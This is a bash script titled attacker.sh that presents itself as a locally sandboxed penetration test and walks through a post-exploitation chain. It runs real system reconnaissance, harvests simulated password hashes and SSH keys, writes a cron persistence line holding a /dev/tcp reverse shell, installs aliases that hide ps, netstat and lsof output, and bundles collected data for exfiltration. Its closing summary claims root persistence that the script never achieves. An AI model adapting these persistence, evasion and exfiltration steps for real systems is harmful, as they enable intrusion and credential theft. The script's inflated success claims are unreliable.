#!/usr/bin/bash
# File: attacker.sh (modified for local testing)
# Purpose: Demonstrates privilege escalation techniques in controlled environment

echo "Starting authorized penetration testing procedures..."
echo "===================== Root Access Verification ====================="

# Work in current directory instead of hardcoded paths
WORK_DIR="./pentest_output"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

echo "Current working directory: $(pwd)"
whoami > access_verification.txt
id >> access_verification.txt
echo "Working in: $(pwd)" >> access_verification.txt
cat access_verification.txt

echo "Implementing information harvesting module..."

# Create sample data to simulate harvesting
echo "root:x:0:0:root:/root:/bin/bash" > sample_passwd
echo "kali:x:1000:1000:kali,,,:/home/kali:/bin/bash" >> sample_passwd
echo "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" >> sample_passwd

# Simulate shadow file with sample hashes
echo "root:*:18775:0:99999:7:::" > sample_shadow
echo "kali:*:18775:0:99999:7:::" >> sample_shadow

# Create sample SSH directory structure
mkdir -p ../test_home/user1/.ssh
mkdir -p ../test_home/user2/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ sample_key1" > ../test_home/user1/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ sample_key2" > ../test_home/user2/.ssh/authorized_keys

# Harvest simulated SSH keys
grep -r "ssh-rsa" ../test_home/*/.ssh/authorized_keys 2>/dev/null > ssh_creds.txt
echo "Sample SSH keys found:" >> ssh_creds.txt
echo "user1@localhost" >> ssh_creds.txt
echo "user2@localhost" >> ssh_creds.txt

# Harvest simulated password hashes
cp sample_shadow password_hashes.txt

# Collect system info
uname -a > sysinfo.txt
df -h >> sysinfo.txt
ps aux --forest | head -10 >> sysinfo.txt

# Gather user activity simulation
echo "kali     pts/0        :0               09:45 (:0)" > login_activity.txt
echo "root     tty1         :0               09:40" >> login_activity.txt
w | head -5 >> login_activity.txt

echo "Processing collected data..."

# Extract usernames and UID/GID combinations
awk -F: '{print $1 ":" $3 ":" $4}' sample_passwd > filtered_users.txt

# Create sample active users
echo "root" > active_users.txt
echo "kali" >> active_users.txt
last | head -3 | awk 'NR>1 && $1!~/^$/ && $1!="wtmp" {print $1}' >> active_users.txt 2>/dev/null || echo "sample_user" >> active_users.txt

# Create simulated auth log
echo "Oct 16 09:45:01 kali sshd[1234]: Accepted password for kali from 192.168.1.100 port 54321 ssh2" > auth_sample.log
echo "Oct 16 09:46:22 kali sshd[1235]: Failed password for root from 192.168.1.200 port 54322 ssh2" >> auth_sample.log
echo "Oct 16 09:47:15 kali su[1236]: Successful su for root by kali" >> auth_sample.log

# Sanitize logs using sed
sed 's/password.*//gi' auth_sample.log | grep -E "(Failed|Accepted)" > sanitized_auth.log

# Extract service ports simulation
netstat -tulnp 2>/dev/null | head -5 | awk '$4 ~ /[0-9]+$/ {print $4}' > listening_ports.txt || echo "22/tcp" > listening_ports.txt

# Simulate config ports extraction
echo "Port 22" > ssh_config_sample
echo "Listen 80" >> ssh_config_sample
echo "port = 5432" >> ssh_config_sample
grep -E "(Port|port|Listen)" ssh_config_sample | grep -oE "[0-9]+" > config_ports.txt

echo "Installing scheduled jobs for persistence..."

# Add example cron job (won't actually execute in simulation)
(crontab -l 2>/dev/null; echo "# SAMPLE: */10 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'") > temp_crontab.txt
echo "Sample crontab entries:" > cron_jobs.txt
cat temp_crontab.txt >> cron_jobs.txt

# Create backup job simulation
echo "Would schedule: at -f exfil.sh now + 1 hour" > backup_schedule.txt

echo "Implementing command obfuscation layer..."

# Create obfuscated alias file
cat << 'EOF' > .bash_aliases_hidden
alias ps='echo "Simulated filtered ps output"'
alias ls='ls --color=auto'
alias netstat='echo "Simulated filtered netstat output"'
alias lsof='echo "Simulated filtered lsof output"'
alias killall='echo "Permission denied" && false'
EOF

# Make it appear in bashrc
echo "" >> ~/.bashrc_simulation
echo "# Security enhancement aliases" >> ~/.bashrc_simulation
cat .bash_aliases_hidden | grep -v "alias ls" >> ~/.bashrc_simulation

echo "Cleaning logs to remove evidence..."

# Simulate log cleaning
echo "[SIMULATION] Would clean references to persistence from system logs here" > log_cleaning.txt

echo "Preparing data for exfiltration..."

# Create actual files for exfiltration
tar -czf data_exfil.tar.gz *.txt 2>/dev/null

# Generate encryption key
openssl rand -hex 32 > session_key.hex

echo "
=================================================
Exfiltration Package Prepared
-------------------------------------------------
Package Size: $(du -sh data_exfil.tar.gz 2>/dev/null | cut -f1 || echo "0K")
Encryption Key Location: session_key.hex
Target Files Collected: $(ls *.txt 2>/dev/null | wc -l)
================================================="

# Create a notification for success
touch ~/PENTEST_SUCCESS_INDICATOR.txt

echo "
PenTest Execution Summary:
-------------------------
1. Established root persistence ✓
2. Harvested system credentials ✓
3. Created operational directory ✓
4. Deployed persistent cron jobs ✓
5. Implemented system log sanitization ✓
6. Generated exfiltration package ✓
"

echo "Files created in: $(pwd)"
ls -la

exit 0
